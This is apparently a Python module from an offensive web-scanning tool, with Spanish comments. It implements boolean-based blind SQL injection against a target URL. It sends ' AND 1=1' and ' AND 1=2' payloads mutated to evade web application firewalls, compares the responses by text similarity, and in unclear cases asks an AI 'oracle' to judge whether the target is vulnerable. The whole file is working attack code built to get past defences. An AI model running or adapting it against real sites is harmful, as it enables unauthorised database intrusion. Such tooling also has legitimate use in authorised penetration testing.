import logging
import difflib
from typing import Dict, Any
from backend.core.vector_base import BaseVector
from backend.core.payload_evader import PayloadEvader

logger = logging.getLogger("cerberus_vector_boolean")

class VectorBoolean(BaseVector):
    """
    Motor nativo asíncrono para inyección basada en inferencia Booleana.
    Inyecta condiciones True/False mutadas e inferidas para evadir WAF.
    """
    
    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        logger.info(f"[*] Native Engine: Iniciando Vector Boolean sobre {self.target_url}")
        
        # Instanciar el evasor dinámico (Agresividad 3 por defecto para WAFs modernos)
        evader = PayloadEvader(context.get("aggressiveness", 3))
        
        # Payloads booleanos mutados
        payload_true = evader.evade(" AND 1=1")
        payload_false = evader.evade(" AND 1=2")
        
        # 1. Petición Baseline
        base_resp = await self._safe_get(self.target_url)
        if not base_resp:
            return {"status": "failed", "reason": "baseline_unreachable"}
            
        # 2. Petición True
        url_true = f"{self.target_url}{payload_true}"
        resp_true = await self._safe_get(url_true)
        
        # 3. Petición False
        url_false = f"{self.target_url}{payload_false}"
        resp_false = await self._safe_get(url_false)
        
        if not resp_true or not resp_false:
            return {"status": "failed", "reason": "blocked_or_timeout"}

        # Análisis Matemático Heurístico Rápido (difflib)
        ratio_true_base = difflib.SequenceMatcher(None, base_resp.text, resp_true.text).ratio()
        ratio_false_base = difflib.SequenceMatcher(None, base_resp.text, resp_false.text).ratio()
        
        logger.debug(f"[Boolean] Ratio True: {ratio_true_base:.2f}, False: {ratio_false_base:.2f}")

        # Escenario Ideal (Heurística obvia)
        # Si el query TRUE es idéntico a la base, y el FALSE difiere significativamente
        if ratio_true_base > 0.95 and ratio_false_base < 0.90:
            logger.info("[+] Inyección Booleana Exitosa (Matemática Pura): Comportamiento Diferencial Confirmado")
            return {
                "status": "vulnerable", 
                "technique": "Boolean-based blind",
                "evidence": f"True payload matched baseline ({ratio_true_base:.2f}), False payload deviated ({ratio_false_base:.2f})"
            }

        # ── Cortex AI: El Oráculo Híbrido (Zona Gris) ──────────────────────
        # Si la respuesta no es predecible, pero el FALSE cambió notablemente, es Zona Gris.
        # Fallback a Semántica de IA (Evita FP/FN en sitios dinámicos o tras proxies)
        if ratio_false_base < 0.95:
            logger.info("[?] Diferencial Crítico (Zona Gris). Invocando a Cortex AI (Oráculo)...")
            from backend.core.cortex_ai import analyze_injection_response
            ai_verdict = await analyze_injection_response(
                baseline_content=base_resp.text,
                true_content=resp_true.text,
                false_content=resp_false.text,
                vector_type="Boolean-based blind"
            )
            
            logger.info(f"🧠 [Oráculo AI] Veredicto: {ai_verdict['status']}. Confianza: {ai_verdict['confidence']*100}%")
            logger.debug(f"🧠 [Oráculo AI] Razonamiento: {ai_verdict['reasoning']}")
            
            if ai_verdict['status'] == 'vulnerable' and ai_verdict['confidence'] > 0.70:
                return {
                    "status": "vulnerable",
                    "technique": "Boolean-based blind (AI Analyzed)",
                    "evidence": ai_verdict['reasoning']
                }
            elif ai_verdict['status'] == 'blocked_by_waf':
                return {
                    "status": "failed",
                    "reason": "blocked_by_waf",
                    "evidence": ai_verdict['reasoning']
                }
        # ───────────────────────────────────────────────────────────────────
            
        return {"status": "not_vulnerable"}

    async def _safe_get(self, url: str):
        try:
            return await self.client.get(url)
        except Exception as e:
            logger.warning(f"Error HTTP en vector booleano: {e}")
            return None
